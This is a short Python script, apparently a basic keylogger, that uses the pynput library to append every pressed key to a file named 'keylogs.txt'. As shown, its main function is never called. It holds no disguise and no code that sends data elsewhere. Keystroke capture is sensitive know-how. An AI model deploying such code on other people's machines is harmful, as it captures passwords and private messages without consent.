from pynput import keyboard

filename: str = "keylogs.txt"

def get_char(key):
    try:
        return key.char
    except AttributeError:
        return str(key)

def on_press(key):
    with open(filename, 'a') as logs:
        logs.write(get_char(key))


def main():
    listener = keyboard.Listener(
        on_press=on_press
    )
    listener.start()

